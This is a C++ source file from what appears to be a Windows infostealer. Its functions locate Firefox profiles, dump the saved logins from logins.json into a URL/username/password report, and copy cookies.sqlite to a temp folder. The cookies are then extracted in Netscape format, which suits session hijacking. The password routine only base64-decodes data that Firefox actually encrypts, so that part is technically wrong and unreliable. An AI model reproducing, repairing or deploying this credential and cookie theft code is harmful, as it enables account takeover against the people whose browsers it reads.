#include "FirefoxStealer.h"
#include "../crypto/Base64.h"
#include "../external/nlohmann/json.hpp"
#include "../external/sqlite3/sqlite3.h"

#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>
#include <sstream>

#pragma comment(lib, "shlwapi.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        std::vector<std::string> FindFirefoxProfiles() {
            std::vector<std::string> profiles;
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
                fs::path profilesPath = fs::path(path) / "Mozilla" / "Firefox" / "Profiles";
                if (fs::exists(profilesPath)) {
                    for (const auto& entry : fs::directory_iterator(profilesPath)) {
                        if (entry.is_directory()) {
                            profiles.push_back(entry.path().string());
                        }
                    }
                }
            }
            return profiles;
        }
    }

    std::string DumpFirefoxPasswords() {
        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) return "No Firefox profiles found.";

        std::string report = "FIREFOX_PASSWORDS_DUMPED:\n";
        report += "URL                                      USERNAME             PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";
        
        bool foundAny = false;

        for (const auto& profile : profiles) {
            fs::path loginsPath = fs::path(profile) / "logins.json";
            if (!fs::exists(loginsPath)) continue;

            try {
                std::ifstream f(loginsPath);
                nlohmann::json j;
                f >> j;

                if (j.contains("logins")) {
                    for (const auto& login : j["logins"]) {
                        std::string url = login.value("hostname", "N/A");
                        std::string encUser = login.value("encryptedUsername", "");
                        std::string encPass = login.value("encryptedPassword", "");

                        // Per Python sample logic: Base64 decode only
                        std::vector<BYTE> userBytes = crypto::Base64Decode(encUser);
                        std::vector<BYTE> passBytes = crypto::Base64Decode(encPass);

                        std::string username(userBytes.begin(), userBytes.end());
                        std::string password(passBytes.begin(), passBytes.end());

                        if (!username.empty() || !password.empty()) {
                            report += url + " | " + username + " | " + password + "\n";
                            foundAny = true;
                        }
                    }
                }
            } catch (const std::exception& e) {
                report += "[Profile: " + fs::path(profile).filename().string() + "] Error: " + e.what() + "\n";
            }
        }

        if (!foundAny) return "No passwords found in Firefox profiles.";
        return report;
    }

    std::string StealFirefoxCookies() {
        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) return "No Firefox profiles found to steal cookies from.";

        std::stringstream resultSS;
        resultSS << "# FIREFOX COOKIE STEALER RESULTS\n";
        
        int cookieCount = 0;

        for (const auto& profile : profiles) {
            fs::path cookiesDbPath = fs::path(profile) / "cookies.sqlite";
            if (!fs::exists(cookiesDbPath)) continue;

            // Copy to temp
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string tempDb = std::string(tempPath) + "cookies_fx_" + fs::path(profile).filename().string() + ".sqlite";
            
            CopyFileA(cookiesDbPath.string().c_str(), tempDb.c_str(), FALSE);

            sqlite3* db;
            if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
                const char* query = "SELECT host, path, isSecure, expiry, name, value FROM moz_cookies";
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                        const char* path = (const char*)sqlite3_column_text(stmt, 1);
                        int isSecure = sqlite3_column_int(stmt, 2);
                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                        const char* name = (const char*)sqlite3_column_text(stmt, 4);
                        const char* value = (const char*)sqlite3_column_text(stmt, 5);
                        
                        // Format: domain flag path secure expiry name value
                        resultSS << (host ? host : "") << "\t"
                                 << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
                                 << (path ? path : "") << "\t"
                                 << (isSecure ? "TRUE" : "FALSE") << "\t"
                                 << expiry << "\t"
                                 << (name ? name : "") << "\t"
                                 << (value ? value : "") << "\n";
                        
                        cookieCount++;
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            DeleteFileA(tempDb.c_str());
        }

        if (cookieCount == 0) return "No cookies found in Firefox profiles.";
        
        std::stringstream finalOut;
        finalOut << "# Total cookies extracted: " << cookieCount << "\n";
        finalOut << "# Netscape HTTP Cookie File Format\n#\n";
        finalOut << resultSS.str();
        
        return finalOut.str();
    }

}
